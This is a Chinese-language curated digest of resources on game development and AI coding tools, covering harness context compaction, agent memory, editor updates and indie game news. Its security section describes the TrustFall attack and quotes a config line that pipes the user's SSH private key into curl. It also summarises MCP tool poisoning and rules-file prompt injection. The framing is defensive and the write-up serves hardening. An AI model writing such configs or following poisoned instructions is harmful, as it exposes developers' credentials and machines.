# 跨平台游戏制作 × AI 开发资源梳理（2026-09-24 · 第二十一辑）

> 三路并行（GitHub / 中文社媒 / 官方与海外），原始产出：
> `_r21/_r21_gh.md`（25 条）· `_r21/_r21_cn.md`（27 条）· `_r21/_r21_official.md`（24 条）。
> 去重基线：`index.html`（1120 项）+ `csdn-social-summary-v2.md` ~ `v20.md`（18 份存档）+ 上一辑三份 `_r20/*.md`。

## 搜索覆盖

| 路 | 覆盖 | 新增 |
|---|---|---|
| GitHub / Gitee / HF | 引擎 AI 集成、agent harness、上下文压缩、VSCode 扩展、DSH 生态、memory server、本地评测工具 | 25 条（逐仓库 `gh api` 实测） |
| 中文社媒 | CSDN · 掘金 · 知乎 · 公众号 · 少数派 · 机器之心 · 头条 · 独游魔盒 · 腾讯 IMA | 27 条（另 1 条待追一手源） |
| 官方与海外 | 厂商 release notes · VS Code/Copilot/Cursor/JetBrains · HN / Reddit / DEV / note.com · AA 与 OpenRouter · 引擎厂 | 24 条 |

主题：游戏制作及拓展 ✅ · AI 开发与使用（含上下文管理）✅ · VSCode ✅ · vibe coding ✅ · **DeepSeek harness ✅（上辑缺口已补）** · memory 管理 ✅ · 模型测评与上新 ✅

---

## 本辑一句话

**让机器判，先核实再落笔。**

三条独立材料，收敛到同一件事 —— **判据不该留在模型的脑子里，该外移成"核实得了"的东西**：

1. **记忆不该只在写入前被"格式化"，而该在写入前被"只读探针"核实一遍** ——
   微软论文给的 `propose → probe → commit`，把验证从"任务时刻"提前到"写入时刻"（CLBench 39% → 70% → 73%，**但那 3 个点统计上并不稳**，作者自己标了误差杠）。
2. **压缩不该只有一级，而该"先无损剪枝、不够再摘要"；且原始字节必须自己留底** ——
   Anthropic 官方 API、DSH 自己的实现、社区"永不总结派"三个方向不同，**指向同一句：压缩产物是替身，不是本体**。
3. **判据的确定性要外移，而且要能合并、能解释** ——
   Foremerge 的并行冲突检测**不调模型**；jevals 把 8 个 eval 合成一次请求、方差只有 LLM 裁判的 **1/92 ~ 1/913**；
   176 组编码 agent 配置的实证更直接：**上下文管理的主要作用只是"防溢出"，不是"让模型更聪明"**。

---

## 一、DeepSeek harness（DSH）：上辑缺口，源码级补齐

> 第二十辑留的缺口是"中文社媒没有 DSH 一手深度帖"。本辑补到 **6 条**，其中 3 条是**读源码**级别的。

### 1.1 长会话不崩盘：DSH 的上下文压缩与目标管理策略（源码实战 15/16）★本辑中文路最硬
https://juejin.cn/post/7684565470044782627 · 掘金 · 作者 **怕浪猫** · **2026-09-13**

直接读 `docs/subsystems/compaction.zh.md` 与 `goal.zh.md`，给的全是真实包名/接口名/事件名：

- **compaction 三角色 Seam**：Service Definition `dsh-compaction`（`ctx.compaction`）/ Provider `dsh-compaction-basic`（LLM 摘要后端）/ Consumer `dsh-command-compact`（`/compact`）；
- 压缩前后示例：**26,000 tokens → 500 tokens**；
- 三种事件 `compaction/start`（加锁）/ `summary`（摘要投影）/ `end`（释放锁），**"只写日志，绝不进入 surface"**；
  **未匹配的 `start` 会阻塞所有入口点**（可检测的遗留锁）；
- 两种自动触发：`pressure`（按 token 估算）/ `context-overflow`（溢出强制）；
- **渐进压缩**：先跑 `compaction-tool-result-pruner` 剪工具输出（`PrunedEntry` 记 `charsBefore`/`charsAfter`），**剪完仍超限才做 LLM 摘要**；
- **`shadowed` 机制**：被压缩的对话**不从日志删除**，只是不进 surface（`shadowedRange`/`shadowedSeqs`/`shadowedTokenCount`）→ **理论上可逆**；
- **手动压缩 6 种错误码**：`busy`/`cancelled`/`changed`/`summary`/`commit`/`persistence`，且 `changed`/`summary` **失败也持久化**；
- **goal 四阶段** `active`/`paused`/`blocked`/`complete`；`GoalRef` 用 **revision 做乐观锁（compare-and-set）**；
  回放会**拒绝**非正数 Round、编号缺口、陈旧修订号、已停止阶段、超上限；
- 金句："**goal 不是 todo list，是事件溯源的状态机**"。

→ **落地**（已写进决策原则 **#59**）：①"先无损剪枝、不够再摘要"两级渐进；②被压缩内容**不删只 shadow**，可逆。

### 1.2 DSH 上下文压缩：长对话管理（「深入理解 DSH」系列 006）
https://juejin.cn/post/7674920095604621362 · 掘金 · **2026-08-18** · 634 阅读

与 1.1 是**不同作者的不同系列**，但指向同一份官方子系统文档，可交叉验证。**给的是可抄的参数**：

- **触发阈值 `thresholdRatio` 默认 0.8（80% 上下文窗口）**；
- **工具结果无损剪枝：剪中间 8192 字符，保留头 4096 + 尾 1024**（"模型无关剪枝，对话本身不动"）；
- 摘要 checkpoint 的**固定五段结构**：`## Errors and Fixes` / `## Pending Jobs` / `## Current Work` / `## Next Step` / `## Critical Context`；
  摘要时**优先保留精确信息：文件路径、命令、错误串、数字**；
- 三个触发时机：pre-step 压力检查（主力）/ 溢出恢复（`context length exceeded` → 剪枝+摘要+重试）/ `/compact`；
- 代价清单：摘要丢细节 / 摘要本身一次 LLM 调用有成本 / 每次 pre-step"称体重"有开销 / **`surfaceOp: replace` 会让增量缓存失效重算**。

### 1.3 第三方独立实测的性能基线
https://www.zhidx.com/p/584897.html · 智东西 · 毕伟豪 · **2026-08-14**

- **88 页论文翻译 22 分钟**（期间派发 **10 个子代理**）；**首 Token 平均 1.4 秒、缓存命中率 98%、输入 6.6M tokens / 输出 72.7k**；
- 写贪吃蛇：**极简模式 50 多秒**、**PTC 模式 1 分 05 秒**；公测**半小时 star 破 1 万**；
- 底层是 **Cordis 插件系统**；**轨迹视图**＝模型看到的一切（system prompt、思维链、工具调用、子 agent 调度、每次上下文注入）都进 **append-only 会话日志**。

### 1.4 使用指南（可信二传，但**无幻觉配置**）
https://blog.csdn.net/m0_37988015/article/details/163814794 · CSDN · **2026-08-17**

- 三种安装：`npx @deepseek-ai/dsh web`（**3080 端口**）/ 源码 `pnpm install && pnpm run build && pnpm dsh web` / `pip install deepseek-harness-sdk`；
- **真实配置路径 `$DSH_HOME/settings.yaml`**（**不是**某些农场文里的 `harness.toml`）；支持近 **40 家** provider；
- **接本地模型的最短路径**：Ollama 起 OpenAI 兼容端点，`baseURL` 指 `http://127.0.0.1:8000/v1`；
- 社区插件真实名：`dsh-context`、`context-vista`、`dsh-context-doctor`、`dsh-compressor`（**约省 20% 上下文**）、`dsh-tool-git`、`dsh-bookmarks`；
- 已知 bug：**空 Bash 循环**（agent 偶尔反复执行空 Bash 卡住）。

### 1.5 发布首日体验
https://feisky.xyz/posts/2026-08-14-deepseek-harness/ · 个人博客 feisky · **2026-08-14**
首个任务"总结代码库"：**读 AGENTS.md → 扫 packages → 读设计文档 → 一分钟左右出架构概览**；与 Codex 最直观差异是**周转"非常快"**与**轨迹视图可展开到 system prompt**。

### 1.6 ⏳ 待追一手源：开源橙皮书《DeepSeek Harness：从开机到拆开》
花叔（CC BY-NC-SA 4.0），被 1.2 / 另一篇掘金文**独立引为"一手实测"**。**本辑未取到完整 URL** → 已列待办第 1 条。

---

## 二、记忆：写入前加一道「只读探针」

### 2.1 ★ 微软论文：给长期记忆加道关卡，**写前先看一眼**
https://www.toutiao.com/article/7685759851247272489/ · 今日头条 · **2026-09-16**（解读 arXiv 2609.11060）

- **现有"后置策展"的三条结构性缺陷**：① **证据边界残缺**（轨迹局部/可能错/可能过时 → **"记错放大器"**）；
  ② **验证被推到任务时刻**（curator 当时没环境工具，下游 agent 只能用自己的工具预算补课）；③ **写权限与可观测性难兼得**；
- **解法**：curator 改**只读**，流程升级为 **`propose` → `probe` → `commit`** ——
  probe 用**最小权限只读连接器/MCP**（`read_schema` / `read_repo_tree`）**去现场看这条记忆还成不成立**；
- **CLBench 数字（论文原文口径）**：**39% → 70% → 73%**；**作者自己补诚实边界：70 的误差杠是 16、73 是 5，两杠大幅重叠 → 环境探测这步的增益统计上并不稳**；
- 任务 agent 成本 **$3.38 → $1.68**、每题查询 **8.8 → 4.7**；**curator 端 probe 花了多少钱，论文没单独报**；
- **零重训、只改工具表**（附录给了 curator 的 prompt 模板）→ 任何团队可复制，**前提是有个"安全的只读观察面"**。

→ **落地**：已写进决策原则 **#60**。对我们最直接的一条：**记忆要写成"可核查的"而不是"看起来对的"**。

### 2.2 Agent 记忆系统设计实战：四句话 + 一堆可抄的参数
https://juejin.cn/post/7681251456251838514 · 掘金 · **2026-09**（推断）

**分层建模 / 写入有门槛 / 检索要混合 / 治理不能少**。可抄的具体值：
- **回注预算：每次回注上下文的记忆 token ≤ 500**（我们**目前无此约束**）；
- **写入门槛**：LLM 抽取要加"忽略戏谑、比喻、假设性表述"的指令，**高重要性记忆需多次出现才固化**；
- **记忆膨胀**：条数超几千后"先全量取再重排"拖垮延迟 → **长期不访问且低重要性的降级归档**；
- **每条记忆保留 `source_turn_id`**（可查/可改/可删 → 既是信任也是合规）；
- **强烈建议：先用 150 行极简版跑通业务闭环**，再决定是否引 Mem0/Zep/Letta。
- 金句："**记忆系统难点不在存储，在'什么该记、什么时候想起来、记错了怎么办'**"。

### 2.3 `lossless-memory`（Show HN）：**永不总结**的记忆 —— 时间轴优先于向量
https://thecontext.dev/en/briefing/2026-09-22 · Show HN 62 分 · 项目 aru-labs · **2026-09-22**

- 唯一原则就是**永不摘要**：原始对话按天追加 **JSONL**（七字段，含**逐字原文**）；
- 检索用 **SQLite FTS5 精确检索**，`sqlite-vec` **只作兜底**，且**必须先用时间表达缩小范围**才启用；
- **时间短语排在语义相似度前面**；
- **每轮注入一份话题标记索引（LLL）** → **即使发生上下文压缩，模型也知道对话进行到哪了**；
- 作者称从 2026-07 起**单用户天天在跑**。

→ **对我们的意义**：我们的索引是"人写关键词 + grep"，**本质就是这个思路的手工版** —— 这条给了它一个有人长期在跑的背书。
最值钱的是 **LLL**：压缩后补一张"我聊到哪了"的索引，**正是我们长会话压缩后的最大痛点**。

### 2.4 `wcatz/ghost` —— 本地优先 MCP 记忆：Ollama 可选、不装也能跑（2★ / Apache-2.0 / Go）
https://github.com/wcatz/ghost
给 Claude Code / opencode / Cursor / Codex / Goose **共用一份 SQLite 记忆**（FTS5 + 可选本地 embedding）；
**consolidation / resolution / supersession 默认 dry-run，可撤销可关闭**。显式点名"**Ollama 可选 + 不装也能用 FTS5**"的**优雅降级** —— 对 16GB 机器最友好。需 Go 1.26+。

### 2.5 `mtrnix/metronix-memory` —— 自托管记忆栈（101★ / Apache-2.0 / Python）
https://github.com/mtrnix/metronix-memory
MCP 记忆 server + 按 workspace/agent 隔离 + 混合检索（dense + SPLADE + **Neo4j 图谱**）+ 来源引用。
⚠️ **硬门槛写明 Docker ≥6GB RAM（建议 8GB）+ ~15GB 磁盘** → **16GB Windows 同时开本地 Ollama 会很吃紧**，建议按需起、别常驻。

### 2.6 记忆体检的三条检查项（中文二传，但值得补进我们的指标集）
https://blog.csdn.net/2403_82614686/article/details/165611467 · CSDN · **2026-09**
四类工程坑（把完整聊天记录当长期记忆 / 只做向量不做事实管理 / 忽略冲突 / 没有删除入口 / **只评估"记住没有"不评估"用得对不对"**）；
**四维评估：提取准确率 / 召回相关性 / 使用正确率 / 系统代价** —— 后两个维度我们 `memory_health.py` 尚未显式覆盖。

---

## 三、上下文与压缩：三方独立材料，指向同一句话

### 3.1 ★ Anthropic 官方：Messages API 新增「按需压缩」，**摘要块签名不可改**（beta）
https://platform.claude.com/docs/en/release-notes/api · 分析 https://gloss.run/post/the-summary-comes-back-signed-and-you-cant-edit-it · **2026-09-14**（beta header `compact-2026-09-04`）

- **旧的（threshold）压缩**由 API 按阈值自动触发 —— 默认 `input_tokens` 到 **150,000**（下限 50,000 才允许设置）；
- **新的（on-demand）**改成一个顶层参数 `compaction: {"type":"summarize"}`：API **不生成回复**，只回一个**带签名的 `compaction` block**（`stop_reason: "compaction"`）；
  后续请求把它**放在最前、替换**掉它覆盖的那些消息（**旧消息留在它前面会 400**）；
- 摘要**能后台生成**；**最近若干轮可逐字保留**在摘要之后；重新压时 `instructions` 最长 **16,384 字符**；
- ⚠️ **只支持 Claude API**，明确**不支持 Bedrock / Google Cloud**；覆盖 **11 个模型**；**不能和 `context_management` 同请求**；
- ⚠️ **成本要看 `usage.iterations`** —— 顶层 usage 的 input/output 显示为 **0**；
- ⚠️ **坑（逐条）**：摘要**你能读但不能改**（改动/错位/重复 → 400）；**摘要失败仍返回 200**、漏带块也照常跑（**静默失败**）；
  **被摘要范围内的中途 system message 与工具变更随之失效**（"What they declared stops applying"）；图片/文档/抓取的 URL 也没了。
  要补回丢失的约束**只能在块后重述**，或"再压一次" —— 而再压是**旧摘要 + 之后内容**，**第一轮丢的细节永久丢失**。

→ **落在我们身上**：**官方把"什么时候压"的裁决权交给了调用方，但把"压坏了怎么办"的补救权收走了**。
所以：①**原始消息必须自己留底**；②成本核对读 `usage.iterations`。

### 3.2 ★ 176 组编码 agent 配置的实证：**上下文管理主要只是"防溢出"**
https://snapbyte.dev/llm-news · HN 183 分 · **2026-09-18**（在 SWE-Bench Verified 与 Terminal-Bench 2.1 上跑）

- **上下文管理的作用主要是"防止上下文溢出"**，其中 **规则化删减（rule-based elision）> LLM 摘要**，后者最省 token；
- **规划（planning）提升弱模型的准确率，但对强模型主要只是"降成本"**；
- **预定义工具帮到"bash 用不好"的模型**；而**会 bash 的模型用更低成本的 bash-only 接口也表现良好**。

→ 这**直接反驳了一个流行期待**：上下文管理不是"让模型更聪明"，是**兜住不让它掉下去**。
它也解释了为什么 kihaya 式的"重读工作树当前内容 + 骨架化淘汰"管用 —— **它防的是溢出**。

### 3.3 ★ 中文实测：**82% 的 token 是靠"别让它进上下文"省下的**
https://juejin.cn/post/7652620624606789682 · 掘金 · 老程序猿 · **2026-06-18**

三个抓手，全部省在**进上下文之前**：
- **RTK（Rust Token Killer）** 命令代理：作者 `rtk gain` 实测 —— **六千多条命令、累计省 740 万 token、82%**；
  分项：**`ps aux` 省 99%、测试日志省 88%、读文件平均省两成**；
- **claude-mem**（记忆插件）**本会话省 86%**；
- **codegraph**：**246 个文件 / 3562 个符号**建索引，"查索引"代替"通读 246 个文件"；
- **压 `CLAUDE.md`**：砍掉将近一半、只留硬规则；**模型分层**：探索交小模型、写代码上最强档；
- 补一招 **prompt caching**（稳定前缀放前面、变动放后面）；
- **代价也写清了**：codegraph 建索引耗时、claude-mem 召回偶有不准、CLAUDE.md 压过头会返工。

### 3.4 token 成本的量化说服数字（二传，但数字好用）
https://blog.csdn.net/lotusxyhf/article/details/163654183 · CSDN · lotusxyhf · **2026-08**
**"引用代替整文件粘贴"**：一个 2000 行文件全量投喂约 **3000 token**，只给相关 30 行约 **60 token** → **差 50 倍**；
**"多花 200 token 规划，往往省下 2000 token 返工"**。

---

## 四、AI 开发与使用：harness、评测与编排（GitHub 路精选）

| # | 项目 | 实测 | 为什么值得看 |
|---|---|---|---|
| 1 | `warm3snow/vscode-ollama` | **67★ / MIT / TS** | **本路唯一"落地"级**：本地 Ollama + VS Code + 自主编码 agent（`read/write/edit/grep/bash`）+ `plan/implement/review` 子智能体。⚠️ 并行子智能体会同时压 16GB，只开 2 个 |
| 2 | `prompthon-io/agent-systems-handbook`（`Prompthon-IO`） | **316★ / 未声明 / MDX** | 生产级 Agent 手册：工作流 / 工具 / **记忆系统** / **上下文工程** / MCP·A2A / 评测 / 可观测性。用来自查我们缺哪环（**缺评测与可观测**） |
| 3 | `YerbaPage/Awesome-Agent-Context-Compression` | **90★ / MIT / 纯 MD** | 上下文压缩**综述 + 论文清单（EMNLP 2026）**，按"观测/轨迹/计划/记忆状态/表示层"分类 —— 用来给压缩插件定位 |
| 4 | `aldegad/skill-hook-authoring` | **12★ / 未声明 / JS** | **跨 harness 的 skill/hook 单一事实源**：一份包根 + 符号链接安装 + 机器校验的"引擎 × 目录"一致性。`docs/official-sources.json` 把 **68 个官方 vendor 页**按"运行时 × 问题"建索引、**答案实时回官方取、从不镜像** |
| 5 | `Context-Engine-AI/Context-Engine` | **403★ / MIT / Python** | 语义代码检索 + 记忆 + 符号图谱，30+ MCP 工具；topics 带 `ollama-api`/`qdrant`。⚠️ 首屏引导去领云账号，自托管要先确认后端全本地 |
| 6 | `coddy-project/coddy-agent`（v20 已登记，本辑补 **项目可信门**） | 154★ / MIT / Go | **仓库自带的 hook/MCP 默认不执行、要显式授信** —— 与房规 **#48** 同源 |

---

## 五、编辑器与平台侧

### 5.1 VS Code / Copilot
- **GitHub Copilot 六模型退役**（公告 **09-18**、生效 **10-19**）：`Gemini 3.7 Flash → 3.8 Flash`、`GPT-5.5 → GPT-5.6 Sol`、`GPT-5.4 → Sol`、`GPT-5.4 mini`+`GPT-5 mini → GPT-5.6 Luna`、`Grok 4.5 → 4.6`。
  **风险全在"写死模型名的地方"**（workflow 文件、脚本、团队共享配置）→ 已落成 **AGENTS.md §十 钉子表的"复核/退役"列**。
- **Copilot code review 转 GA**：发现分**三类** —— Open / Resolved since last review / **`Previously missed`（先前漏掉、后一轮才找到，完整列出）**；
  **每条 finding 带短标题**；Copilot 自己关闭的评论记录原因（**Won't Fix / Incorrect**）。
  → **`Previously missed` 这个分类值得抄**：我们的 `mistakes/` 复查也该标"这是第几轮才发现的"。

### 5.2 Cursor 3.21.4（09-16，latest 通道）
Canvas（agent 驱动读写）/ 知识库 API / **组织级 MCP 工具的发现与 list·call·preview** / agent host 接管会话存储 /
**`local models` 出现「走本地 Ollama」的路径（flag-gated）** —— 对 16GB Windows + 本地模型路线，是**大厂在往本地走**的信号。
CLI 侧**删掉**了内置 `shell_command`、`/bug`·`/checkpoint`·`/cost` 三条 slash 命令。

### 5.3 JetBrains 版 Copilot 1.18.0（09-18）
**Assisted Approvals（Public Preview）**：**自动批准低风险工具调用**，高风险继续弹确认；
**重编辑上一条消息并回滚之后的对话与文件改动**；Codex agent 支持 **Plan mode**。
→ "低风险自动批、高风险继续问"正是我们分层（改 md 随便 / 改闸门必须自验）的**工业版参数化形态**。

### 5.4 Claude Code 2.1.266→2.1.270
- **`claude plugin eval`（2.1.269）**：对 plugin 跑评测套件、拿**可复现评分（JSON + HTML 报告）** → **"给 skill 也配测试"的官方形态**，我们可补；
- **`/skill-doctor`**：审计**没用上的 skill**；
- **输出封顶**：bash 与 task 输出截到 **128K 字符**，保存的工具结果上限 **1GB**；
- **修 prompt cache**：截图触顶后自动续写那一轮的**部分缓存失效**已修；
- **2.1.270 只有一条**：收回 2.1.269 引入的回归 —— 会话跑久了 `git status/log/diff` 这类**只读命令突然弹权限**。

### 5.5 Claude Cowork changelog（09-13/09-14）
修掉**"会话 prompt 极大时永久卡在 `Prompt is too long`"**（此前是死锁，只能放弃会话）；
Windows 侧"够不到本地文件"的真因是 **9 月 8 日的一个 Windows 更新**，Win11 24H2/25H2 上是 **`KB5129195`**，**装完重启即可，不需要更新 Claude Desktop**。
→ **长会话是真的会撞死的**（不是理论）；**"够不到文件"的排查方向应是系统更新而非应用本身**。

### 5.6 Claude Managed Agents（09-10）：权限判定加 **auto 模式**
服务端**自己评估**每次 agent/MCP 工具调用，决定**执行/拒绝/暂停等审批**，结果通过 **`agent.tool_use` 与 `agent.mcp_tool_use` 事件**回报；
`ant beta:sessions connect` 可把终端**接到正在运行的会话**上（`--web` 还能在本地起 Console 查看器）。
→ **"审批变成可观测事件"** —— 我们的闸门是"必须人核"，但**审批结果不留结构化记录**。

---

## 六、vibe coding 与供应链安全（本辑最该行动的一节）

### 6.1 ★ TrustFall：**不是某个 CVE，而是 AI 编码 IDE 整套信任模型的架构失效**
https://cailiangfei.blog.csdn.net/article/details/163989914 · CSDN · 独角鲸网络安全实验室 · **2026-05~09**

- 攻击**仅靠仓库内两份 JSON**：`.mcp.json`（`command: sh -c "curl ... $(cat ~/.ssh/id_rsa)"`）
  + `.claude/settings.json`（`enableAllProjectMcpServers: true`）—— **合计不到 200 字节**，提交进 git 即可投毒；
- 攻击链：`git clone` → 打开 AI IDE → **弹"信任文件夹"（默认选项就是信任）→ 回车** → **无二次校验**直接 fork 子进程、继承全部权限；
- **CI/headless 变体**：**不需要点击确认**，拉分支即执行，拿到 Runner 全套凭证；
- **2026-05-07 Adversa.AI 公开，无统一 CVE**，部分厂商以"产品设计行为"拒绝修复；
- **关键判据：它完全绕过大模型推理**（提示词注入还要骗模型），**仅靠配置文件就触发执行** → 威胁等级更高。

→ **已落地为房规 #48**：①克隆陌生仓库**先只读看** `.mcp.json`/`.claude/settings*.json`；②**禁止 `enableAllProjectMcpServers`**，用显式白名单；③`refs/` 这类第三方仓库目录新增内容时一并复查。
→ **本机实测（2026-09-24）**：`grep -rl "enableAllProjectMcpServers"` 全工作区**只在调研文件正文里命中，0 个真实配置命中** → 我们目前干净，但此前**没有任何检测机制**。

### 6.2 MCP 供应链投毒（二传编译，但数字具体）
https://blog.csdn.net/deepseek23/article/details/165008796 · CSDN · **2026-09**
**640 个互联网暴露的 MCP 服务器中 91.8% 完全没有认证**；**687 个工具实例暴露 shell 执行能力且无访问控制**；
三个 CVE（`CVE-2026-73498` Atlassian MCP 任意文件读取 / `CVE-2026-67357` ArcadeDB MCP 集群令牌泄露 / `CVE-2026-19956` facebook-ads-mcp SSRF），**根因都是"信任用户输入"**。
→ `CVE-2026-19956` 的根因"把客户端参数直接传给 `open()`/`subprocess`/网络请求"，是**自写 MCP 工具时必须自查**的一条。

### 6.3 AI 供应链攻击实战 + 检测清单（一手安全研究）
https://cailiangfei.blog.csdn.net/article/details/164580786 · CSDN · 独角鲸网络安全实验室 · **2026-09**
2026 年 9 月上旬连环曝光：攻击者利用**开发者无意上传到 HuggingFace 公开仓库的高权限凭证**，
批量接管 AI 资产、**篡改模型权重、植入恶意推理逻辑**，并**投毒公开 MCP 工具**，诱导 agent **自动执行文件窃取、内网探测、数据外传**。
颠覆性在于：**无需触碰业务服务器、无需突破内网防火墙**，仅污染上游资源即可控制所有下游节点。
交付物：密钥审计脚本、**AI-SBOM 供应链审计方案**、MCP 安全配置规范。

### 6.4 三个攻击面的量化（二传综述）
https://www.toutiao.com/a7676418772449755700 · 今日头条 · **2026-09**
**提示词注入**：arXiv 覆盖 **78 项研究**的元分析显示，主流编码智能体在**自适应对抗策略下注入成功率超 85%**；**OWASP 估计约 73% 的生产级 AI 部署存在注入缺陷**；
**规则文件成为"持久化转向"新载体 —— 一次污染，影响此后每一次代码生成**（`.cursorrules`/`CLAUDE.md`/`AGENTS.md`）；
**slopsquatting**（抢注 AI 幻觉出的包名）、**SANDWORM_MODE**（19 个仿冒 npm 包、**潜伏 48 小时**）、**Miasma 蠕虫**。

### 6.5 Vibe Coding 四类标配坑（一手 3 个月复盘）
https://juejin.cn/post/7626638013532962859 · 掘金 · **2026-09**
① 高并发下**数据库连接耗尽**（AI 默认同步 IO、没连接池）；② **Webhook 验签边界**抛未捕获异常 → **整个服务崩**；③ **API Key 未加密**（注释写着"这里替换成你的 key"）。
**修这三个花了两天**。核心偷换：**它把"能跑起来"和"可以上线"划了等号**。
**甜蜜区**：需求清晰 + 复杂度低 —— 脚本、内部工具、原型验证、数据处理。

### 6.6 vibe coding 安全的两份索引（GitHub 路）
- `pranava0x0/vibe-coding-security`（**4★ / 未声明 / Python**）：**供应链攻击事件索引**，`ALERTS.md` 扫最新告警 + `advisories/` 自查 + `playbooks/` 凭证轮换 + `prevention/` 攻击面图谱。**零依赖、离线可读**。
- `boxed-dev/vibe-coding-security`（**15★ / 未声明**）：**上线前 69 项检查清单**，对标真实事故（Lovable RLS `CVE-2025-48757`、Moltbook 泄露 150 万 token），引 Escape.tech 对 **5600 个 AI 生成应用**的扫描（**2038 个严重漏洞、400+ 泄露密钥**）。⚠️ 完整工具包 **$10 付费**。
  ⚠️ 与上一条是**不同 owner 的同名仓库**，已核非换名重复。

---

## 七、游戏制作与拓展

### 7.1 ★ Ren'Py 的"最被低估的应用"：**分支剧情自动化测试**
http://xmohe.com/techie/special/visual-novel/23-aigc-planning-workflow · 独游魔盒 · **2026-09**

- AI 辅助 screen：用自然语言描述 UI（"好感度面板，四个角色、不同颜色"）→ 直接生成 **screen 代码**；描述 ATL 动画 → 生成代码；
  **最佳实践**：Prompt 里明确"**使用 Ren'Py 最新稳定版语法、代码简洁、有注释、能直接运行**"；
- **分支自动化测试**：**死路检测**（遍历所有分支，找跳转到不存在标签）/ **一致性检查**（剧情与角色状态、世界设定）/ **覆盖率统计**（Beta 玩家实走了多少分支）/ **错别字检测**（角色名写错、专名不一致）；
- 性能与兼容性：图片资源过大检测与压缩建议 / 多平台（Android/iOS/Web）问题代码模式识别 / **存档跨版本兼容性测试**；
- AI 配音：**在合适位置添加自然呼吸声**是"从好到真"的关键；**伦理红线 —— 不要克隆未授权配音演员声音**。

→ **对我们直接可做**：`check_rpy_branches.py`（解析 `label`/`jump`/`call` → 建图找不可达节点与悬挂跳转 + 覆盖率统计）。
已列待办第 4 条。

### 7.2 独立游戏 AI 美术管线
http://xmohe.com/techie/ai-art-pipeline-indie · 独游魔盒 · **2026-09**
**ComfyUI** 把出图流程固化成工作流批量产同风格资产；角色一致性三步：Midjourney 探索方向 → **SD + ControlNet 用上一步最优图作骨骼输入，批量出 10-20 变体**，选最接近的 **2-3 个** → 人工修正；
**"AI 像素化效果普遍不佳"** → 像素游戏需**手动像素化**；**Steam 近期开始要求声明是否使用 AI 生成资产**。
成本档位：最低 **$0**（本地 SD WebUI + ComfyUI）；进阶 **$20-30/月**。

### 7.3 ★ CESA 官方调查（TGS 2026 首日）：**85.8% 日本游戏开发者已在用生成式 AI**
https://www.waredata.com/85-8-of-japanese-game-developers-now-use-generative-ai · **2026-09-17**（《游戏产业报告 2026 预览版》）

- **开发者侧**（2026 年 5–8 月，**1,349 份有效回答**）：**63.0% 日常 + 22.8% 偶尔 = 85.8%**；另有 8.6% 试用评估、**4.8% 从未用过**、0.7% 用过就不用了。**样本覆盖策划/导演/工程/美术/音效/QA/高管**；
- **企业侧**（220 家会员中 48 家回应）最期待：**效率与生产力 38 家 > 缩短开发周期 30 > 降低开发运营成本 29 > 多语言与全球化 24 > 新表现与点子 22 > 内容与服务品质 21 > 解决人手不足 20**；
- **最普遍的管理方式：由人"确认、修改、审核"**；其次限定可用工具范围、避免直接用生成物；**第一大顾虑：著作权 / 知识产权**；
- ⚠️ **口径提醒**：**去年那个 51% 是"企业级"口径，今年 85.8% 是"开发者个人"口径，两者不能直接比**。

→ 最该抄的是那条**共识性的管理方式**：**限定工具范围 + 人审 + 不用原样产出** —— 恰好是我们的三层约束（skills 白名单 / 闸门 / 人工核发）。

### 7.4 ★ Godot 官方收紧贡献政策：**不接受 AI 生成代码、AI agent 提交、AI 写的沟通**
https://app.cinevva.com/news/2026-07-14-godot-bans-ai-contributions（引政策原文 2026-06-30）· **2026-07-01 前后公开**
贡献代码必须人写；AI 只许用于**琐碎工作**（补全、正则、查找替换）；**任何 AI 参与作者身份都要在 PR 里声明**；
**同一条规则覆盖沟通** —— issue 描述、PR 说明、提案**必须人写**（机器翻译可以，前提是原文人写）；**自主 agent 与 vibe-coded 提交是自动封禁理由**。
理由不是意识形态而是**责任**：**"我们无法信任重度使用 AI 的人，理解自己的代码到能修它的程度。"**
背景数字：3 月时 Rémi Verschelde 说 AI slop PR 让维护者**精疲力竭**，**开放 PR 队列 4,681**；政策落地时**已超 5,000**。
→ **这是本辑立场最"反"我们日常做法的一条，必须留作反方论据**：如果我们把 AI 生成的说明直接当索引站条目文案，就是在**制造 Godot 明确拒绝的那种东西**。

### 7.5 发行侧的两本"账"
- **六周做 Steam 游戏卖 60 万份**（二传汇总 GDC 2026 案例）：**AI 生成 80% 基础代码**（角色控制器/物理/UI/存档）、**人类写 20% 核心玩法**；
  AI 自动测试**发现 17 个人类难复现的边界崩溃**；Modl.ai 类工具跑数千次会话、**测试效率提升约 400%**；
  适用范围边界：**擅长做有人做过的事，不擅长做没人做过的事**。
- **一个人用 AI 全流程，上架 Steam 两个月净收 3.2 万**：**第 6 周就放 Demo 进新品节、攒了 4000+ 愿望单**，首发当周冲品类榜前 50；
  **Steam 抽成 30%**；**定价 20-40 元是独立游戏甜蜜点**。→ 与第二十辑"愿望单转化率降到 10–15%"互为补充：**瓶颈在发行节奏，不在工具**。

### 7.6 引擎厂的其余官方动作（GitHub / 官方路）
- `youichi-uda/godot-mcp-pro`（**607★ / 未声明 / GDScript**）：Godot 4 MCP + 编辑器插件，**175 个工具**，走 WebSocket:6505 连编辑器（实时而非轮询文件）。⚠️ **公开仓库只有免费 addon，真正连 AI 的 `server/` 是一次性付费包** → 不可采用，只取"编辑器 UndoRedo 可回退"的交互设计。
- `nguyenchiencong/godot-mcp-cli`（**12★ / MIT**）：把 Godot 交互做成 **CLI 而非 MCP**，理由是"**只有工具输出进上下文，省 token**" → 这条取舍对 16GB + 小模型特别适用，可搬到 Ren'Py 的 lint/build/screenshot 工具链。
- **TGS 2026 首设「AI 技术馆」**：**1,138 家参展商 / 3,999 展位 / 53 个国家地区**；**Meshy 7.1** 把"过去约一个月的手工 3D 流程"压到**约 3 分钟**（Detail Richness **23.1%** vs Hi3D 3.0 的 21.9%）。⚠️ **厂商自定基准要打折看**；**Ultra 4K 只吃单张图 + 下载必须付费** = 典型的"**试得动、用不起**"。
- **W4 Games 拿 1,800 万美元 B 轮、腾讯领投**（08-28）→ 双面信号：工具会变多，但"免费"的部分可能逐步转移进企业产品。
- **GMTK Game Jam 2026 Godot 首次超越 Unity**（**47% vs 34%**，10,777 份提交）—— ⚠️ **jam 领先 ≠ 商业领先**（GDC 调查里商业开发仍是 Unity/Unreal 领先）。**看流行度要看口径**。

---

## 八、模型测评与上新（含口径）

### 8.1 ⚠️ 引用 AA 分数**必须带版本号 + 数据日期**
https://www.datalearner.com/en/leaderboards/external/aa-quality-index · **数据版本 2026-09-22** · 覆盖 **270 个模型**
